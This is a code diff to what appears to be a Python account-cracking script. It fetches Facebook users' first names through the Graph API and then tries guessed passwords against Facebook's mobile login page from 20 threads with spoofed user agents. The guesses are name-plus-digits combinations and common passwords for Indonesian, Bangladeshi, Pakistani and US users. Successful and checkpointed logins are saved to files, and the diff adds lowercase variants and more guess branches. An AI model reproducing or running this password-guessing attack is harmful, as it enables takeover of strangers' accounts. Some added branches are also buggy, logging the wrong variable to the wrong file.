@@ -346,7 +346,7 @@ def pilih_indo():
 		try:
 			an = requests.get('https://graph.facebook.com/'+em+'/?access_token='+toket)
 			v = json.loads(an.text)
-			pw = v['first_name']+'123'
+			pw = v['first_name'].lower()+'123'
 			rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"})
 			xo = rex.content
 			if 'mbasic_logout_button' in xo or 'save-device' in xo:
@@ -363,7 +363,7 @@ def pilih_indo():
 					cek.close()
 					CP.append(em)
 				else:
-					pw2 = v['first_name']+'12345'
+					pw2 = v['first_name'].lower()+'12345'
 					rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw2, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6265; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36"})
 					xo = rex.content
 					if 'mbasic_logout_button' in xo or 'save-device' in xo:
@@ -380,7 +380,7 @@ def pilih_indo():
 							cek.close()
 							CP.append(em)
 						else:
-							pw3 = v['first_name']+'1234'
+							pw3 = v['first_name'].lower()+'1234'
 							rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw3, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.83 Mobile Safari/537.36"})
 							xo = rex.content
 							if 'mbasic_logout_button' in xo or 'save-device' in xo:
@@ -397,7 +397,7 @@ def pilih_indo():
 									cek.close()
 									CP.append(em)
 								else:
-									pw4 = 'Sayang'
+									pw4 = v['first_name'].lower()
 									rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw4, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36"})
 									xo = rex.content
 									if 'mbasic_logout_button' in xo or 'save-device' in xo:
@@ -413,6 +413,74 @@ def pilih_indo():
 											cek.write('\n   [CP] '+em+' • '+pw4)
 											cek.close()
 											CP.append(em)
+										else:
+											pw5 = 'sayang'
+											rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw5, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36"})
+											xo = rex.content
+											if 'mbasic_logout_button' in xo or 'save-device' in xo:
+												print '\033[0;97m   [OK]\033[0;97m '+em+' \033[0;97m• \033[0;97m'+pw5
+												oke = open('done/indo.txt', 'a')
+												oke.write('\n   [OK] '+em+' • '+pw5)
+												oke.close()
+												oks.append(em)
+											else:
+												if 'checkpoint' in xo:
+													print '\033[0;97m   [CP]\033[0;97m '+em+' \033[0;97m•\033[0;97m '+pw5
+													cek = open('done/indo.txt', 'a')
+													cek.write('\n   [CP] '+em+' • '+pw5)
+													cek.close()
+													CP.append(em)
+												else:
+													pw6 = 'bismillah'
+													rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw6, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36"})
+													xo = rex.content
+													if 'mbasic_logout_button' in xo or 'save-device' in xo:
+														print '\033[0;97m   [OK]\033[0;97m '+em+' \033[0;97m• \033[0;97m'+pw6
+														oke = open('done/indo.txt', 'a')
+														oke.write('\n   [OK] '+em+' • '+pw6)
+														oke.close()
+														oks.append(em)
+													else:
+														if 'checkpoint' in xo:
+															print '\033[0;97m   [CP]\033[0;97m '+em+' \033[0;97m•\033[0;97m '+pw6
+															cek = open('done/indo.txt', 'a')
+															cek.write('\n   [CP] '+em+' • '+pw6)
+															cek.close()
+															CP.append(em)
+														else:
+															pw7 = '123456'
+															rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw7, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36"})
+															xo = rex.content
+															if 'mbasic_logout_button' in xo or 'save-device' in xo:
+																print '\033[0;97m   [OK]\033[0;97m '+em+' \033[0;97m• \033[0;97m'+pw7
+																oke = open('done/indo.txt', 'a')
+																oke.write('\n   [OK] '+em+' • '+pw7)
+																oke.close()
+																oks.append(em)
+															else:
+																if 'checkpoint' in xo:
+																	print '\033[0;97m   [CP]\033[0;97m '+em+' \033[0;97m•\033[0;97m '+pw7
+																	cek = open('done/indo.txt', 'a')
+																	cek.write('\n   [CP] '+em+' • '+pw7)
+																	cek.close()
+																	CP.append(em)
+																else:
+																	pw8 = 'anjing'
+																	rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw8, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36"})
+																	xo = rex.content
+																	if 'mbasic_logout_button' in xo or 'save-device' in xo:
+																		print '\033[0;97m   [OK]\033[0;97m '+em+' \033[0;97m• \033[0;97m'+pw8
+																		oke = open('done/indo.txt', 'a')
+																		oke.write('\n   [OK] '+em+' • '+pw8)
+																		oke.close()
+																		oks.append(em)
+																	else:
+																		if 'checkpoint' in xo:
+																			print '\033[0;97m   [CP]\033[0;97m '+em+' \033[0;97m•\033[0;97m '+pw8
+																			cek = open('done/indo.txt', 'a')
+																			cek.write('\n   [CP] '+em+' • '+pw8)
+																			cek.close()
+																			CP.append(em)
 		except:
 			pass
 	p = ThreadPool(20)
@@ -501,7 +569,7 @@ def pilih_bangla():
 		try:
 			an = requests.get('https://graph.facebook.com/'+em+'/?access_token='+toket)
 			v = json.loads(an.text)
-			pz = v['first_name']+'123'
+			pz = v['first_name'].lower()+'123'
 			rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pz, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"})
 			xo = rex.content
 			if 'mbasic_logout_button' in xo or 'save-device' in xo:
@@ -518,7 +586,7 @@ def pilih_bangla():
 					cek.close()
 					CP.append(em)
 				else:
-					pz2 = v['first_name']+'12345'
+					pz2 = v['first_name'].lower()+'12345'
 					rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pz2, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6265; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36"})
 					xo = rex.content
 					if 'mbasic_logout_button' in xo or 'save-device' in xo:
@@ -535,7 +603,7 @@ def pilih_bangla():
 							cek.close()
 							CP.append(em)
 						else:
-							pz3 = v['first_name']+'1234'
+							pz3 = v['first_name'].lower()+'1234'
 							rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pz3, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.83 Mobile Safari/537.36"})
 							xo = rex.content
 							if 'mbasic_logout_button' in xo or 'save-device' in xo:
@@ -568,6 +636,57 @@ def pilih_bangla():
 											cek.write('\n   [CP] '+em+' • '+pz4)
 											cek.close()
 											CP.append(em)
+										else:
+											pz5 = v['first_name'].lower()+'786'
+											rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pz5, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36"})
+											xo = rex.content
+											if 'mbasic_logout_button' in xo or 'save-device' in xo:
+												print '\033[0;97m   [OK]\033[0;97m '+em+' \033[0;97m• \033[0;97m'+pz5
+												oke = open('done/bangla.txt', 'a')
+												oke.write('\n   [OK] '+em+' • '+pz5)
+												oke.close()
+												oks.append(em)
+											else:
+												if 'checkpoint' in xo:
+													print '\033[0;97m   [CP]\033[0;97m '+em+' \033[0;97m•\033[0;97m '+pz5
+													cek = open('done/bangla.txt', 'a')
+													cek.write('\n   [CP] '+em+' • '+pz5)
+													cek.close()
+													CP.append(em)
+												else:
+													pz6 = '000786'
+													rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pz6, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36"})
+													xo = rex.content
+													if 'mbasic_logout_button' in xo or 'save-device' in xo:
+														print '\033[0;97m   [OK]\033[0;97m '+em+' \033[0;97m• \033[0;97m'+pz6
+														oke = open('done/bangla.txt', 'a')
+														oke.write('\n   [OK] '+em+' • '+pz6)
+														oke.close()
+														oks.append(em)
+													else:
+														if 'checkpoint' in xo:
+															print '\033[0;97m   [CP]\033[0;97m '+em+' \033[0;97m•\033[0;97m '+pz6
+															cek = open('done/bangla.txt', 'a')
+															cek.write('\n   [CP] '+em+' • '+pz6)
+															cek.close()
+															CP.append(em)
+														else:
+															pz7 = '102030'
+															rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pz7, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36"})
+															xo = rex.content
+															if 'mbasic_logout_button' in xo or 'save-device' in xo:
+																print '\033[0;97m   [OK]\033[0;97m '+em+' \033[0;97m• \033[0;97m'+pz7
+																oke = open('done/bangla.txt', 'a')
+																oke.write('\n   [OK] '+em+' • '+pz7)
+																oke.close()
+																oks.append(em)
+															else:
+																if 'checkpoint' in xo:
+																	print '\033[0;97m   [CP]\033[0;97m '+em+' \033[0;97m•\033[0;97m '+pz7
+																	cek = open('done/bangla.txt', 'a')
+																	cek.write('\n   [CP] '+em+' • '+pz7)
+																	cek.close()
+																	CP.append(em)
 		except:
 			pass
 	p = ThreadPool(20)
@@ -656,7 +775,7 @@ def pilih_pakis():
 		try:
 			ah = requests.get('https://graph.facebook.com/'+ef+'/?access_token='+toket)
 			p = json.loads(ah.text)
-			pb = 'Pakistan'
+			pb = 'pakistan'
 			rep = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : ef, "pass" : pb, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"})
 			xs = rep.content
 			if 'mbasic_logout_button' in xs or 'save-device' in xs:
@@ -690,7 +809,7 @@ def pilih_pakis():
 							cek.close()
 							CP.append(ef)
 						else:
-							pb3 = p['first_name']+'1234'
+							pb3 = p['first_name'].lower()+'1234'
 							rep = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : ef, "pass" : pb3, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.83 Mobile Safari/537.36"})
 							xs = rep.content
 							if 'mbasic_logout_button' in xs or 'save-device' in xs:
@@ -707,7 +826,7 @@ def pilih_pakis():
 									cek.close()
 									CP.append(ef)
 								else:
-									pb4 = p['first_name']+'12345'
+									pb4 = p['first_name'].lower()+'12345'
 									rep = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : ef, "pass" : pb4, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36"})
 									xs = rep.content
 									if 'mbasic_logout_button' in xs or 'save-device' in xs:
@@ -724,7 +843,7 @@ def pilih_pakis():
 											cek.close()
 											CP.append(ef)
 										else:
-											pb5 = p['first_name']+'123'
+											pb5 = p['first_name'].lower()+'123'
 											rep = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : ef, "pass" : pb5, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6265; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36"})
 											xs = rep.content
 											if 'mbasic_logout_button' in xs or 'save-device' in xs:
@@ -828,7 +947,7 @@ def pilih_usa():
 		try:
 			an = requests.get('https://graph.facebook.com/'+em+'/?access_token='+toket)
 			v = json.loads(an.text)
-			px = v['first_name']+'123'
+			px = v['first_name'].lower()+'123'
 			rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : px, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"})
 			xo = rex.content
 			if 'mbasic_logout_button' in xo or 'save-device' in xo:
@@ -845,7 +964,7 @@ def pilih_usa():
 					cek.close()
 					CP.append(em)
 				else:
-					px2 = v['first_name']+'12345'
+					px2 = v['first_name'].lower()+'12345'
 					rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : px2, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6265; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36"})
 					xo = rex.content
 					if 'mbasic_logout_button' in xo or 'save-device' in xo:
@@ -862,7 +981,7 @@ def pilih_usa():
 							cek.close()
 							CP.append(em)
 						else:
-							px3 = v['first_name']+'1234'
+							px3 = v['first_name'].lower()+'1234'
 							rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : px3, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.83 Mobile Safari/537.36"})
 							xo = rex.content
 							if 'mbasic_logout_button' in xo or 'save-device' in xo:
@@ -895,6 +1014,23 @@ def pilih_usa():
 											cek.write('\n   [CP] '+em+' • '+px4)
 											cek.close()
 											CP.append(em)
+										else:
+											px5 = 'iloveyou'
+											rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : px5, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36"})
+											xo = rex.content
+											if 'mbasic_logout_button' in xo or 'save-device' in xo:
+												print '\033[0;97m   [OK]\033[0;97m '+em+' \033[0;97m• \033[0;97m'+px5
+												oke = open('done/usa.txt', 'a')
+												oke.write('\n   [OK] '+em+' • '+px5)
+												oke.close()
+												oks.append(em)
+											else:
+												if 'checkpoint' in xo:
+													print '\033[0;97m   [CP]\033[0;97m '+em+' \033[0;97m•\033[0;97m '+px5
+													cek = open('done/usa.txt', 'a')
+													cek.write('\n   [CP] '+em+' • '+px5)
+													cek.close()
+													CP.append(em)
 		except:
 			pass
 	p = ThreadPool(20)
@@ -949,7 +1085,7 @@ def crack_like():
 		try:
 			an = requests.get('https://graph.facebook.com/'+em+'/?access_token='+toket)
 			v = json.loads(an.text)
-			pc = v['first_name']+'123'
+			pc = v['first_name'].lower()+'123'
 			rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pc, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"})
 			xo = rex.content
 			if 'mbasic_logout_button' in xo or 'save-device' in xo:
@@ -966,7 +1102,7 @@ def crack_like():
 					cek.close()
 					CP.append(em)
 				else:
-					pc2 = v['first_name']+'12345'
+					pc2 = v['first_name'].lower()+'12345'
 					rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pc2, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6265; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36"})
 					xo = rex.content
 					if 'mbasic_logout_button' in xo or 'save-device' in xo:
@@ -983,7 +1119,7 @@ def crack_like():
 							cek.close()
 							CP.append(em)
 						else:
-							pc3 = v['first_name']+'1234'
+							pc3 = v['first_name'].lower()+'1234'
 							rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pc3, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.83 Mobile Safari/537.36"})
 							xo = rex.content
 							if 'mbasic_logout_button' in xo or 'save-device' in xo:
@@ -1000,7 +1136,7 @@ def crack_like():
 									cek.close()
 									CP.append(em)
 								else:
-									pc4 = v['last_name']+'123'
+									pc4 = v['last_name'].lower()+'123'
 									rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pc4, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36"})
 									xo = rex.content
 									if 'mbasic_logout_button' in xo or 'save-device' in xo:
@@ -1016,6 +1152,23 @@ def crack_like():
 											cek.write('\n   [CP] '+em+' • '+pc4)
 											cek.close()
 											CP.append(em)
+										else:
+											pc5 = '123456'
+											rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pc5, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36"})
+											xo = rex.content
+											if 'mbasic_logout_button' in xo or 'save-device' in xo:
+												print '\033[0;97m   [OK]\033[0;97m '+em+' \033[0;97m• \033[0;97m'+pc5
+												oke = open('done/like.txt', 'a')
+												oke.write('\n   [OK] '+em+' • '+pc5)
+												oke.close()
+												oks.append(em)
+											else:
+												if 'checkpoint' in xo:
+													print '\033[0;97m   [CP]\033[0;97m '+em+' \033[0;97m•\033[0;97m '+pc5
+													cek = open('done/like.txt', 'a')
+													cek.write('\n   [CP] '+em+' • '+pc5)
+													cek.close()
+													CP.append(em)
 		except:
 			pass
 	p = ThreadPool(20)
@@ -1104,7 +1257,7 @@ def pilih_follow():
 		try:
 			an = requests.get('https://graph.facebook.com/'+em+'/?access_token='+toket)
 			v = json.loads(an.text)
-			pr = v['first_name']+'123'
+			pr = v['first_name'].lower()+'123'
 			rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pr, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"})
 			xo = rex.content
 			if 'mbasic_logout_button' in xo or 'save-device' in xo:
@@ -1121,7 +1274,7 @@ def pilih_follow():
 					cek.close()
 					CP.append(em)
 				else:
-					pr2 = v['first_name']+'12345'
+					pr2 = v['first_name'].lower()+'12345'
 					rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pr2, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6265; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36"})
 					xo = rex.content
 					if 'mbasic_logout_button' in xo or 'save-device' in xo:
@@ -1138,7 +1291,7 @@ def pilih_follow():
 							cek.close()
 							CP.append(em)
 						else:
-							pr3 = v['first_name']+'1234'
+							pr3 = v['first_name'].lower()+'1234'
 							rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pr3, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.83 Mobile Safari/537.36"})
 							xo = rex.content
 							if 'mbasic_logout_button' in xo or 'save-device' in xo:
@@ -1155,7 +1308,7 @@ def pilih_follow():
 									cek.close()
 									CP.append(em)
 								else:
-									pr4 = v['first_name']+'321'
+									pr4 = v['first_name'].lower()+'321'
 									rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pr4, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36"})
 									xo = rex.content
 									if 'mbasic_logout_button' in xo or 'save-device' in xo:
@@ -1171,6 +1324,23 @@ def pilih_follow():
 											cek.write('\n   [CP] '+em+' • '+pr4)
 											cek.close()
 											CP.append(em)
+										else:
+											pr5 = '123456'
+											rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pr5, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36"})
+											xo = rex.content
+											if 'mbasic_logout_button' in xo or 'save-device' in xo:
+												print '\033[0;97m   [OK]\033[0;97m '+em+' \033[0;97m• \033[0;97m'+pc5
+												oke = open('done/like.txt', 'a')
+												oke.write('\n   [OK] '+em+' • '+pc5)
+												oke.close()
+												oks.append(em)
+											else:
+												if 'checkpoint' in xo:
+													print '\033[0;97m   [CP]\033[0;97m '+em+' \033[0;97m•\033[0;97m '+pc5
+													cek = open('done/like.txt', 'a')
+													cek.write('\n   [CP] '+em+' • '+pc5)
+													cek.close()
+													CP.append(em)
 		except:
 			pass
 	p = ThreadPool(20)
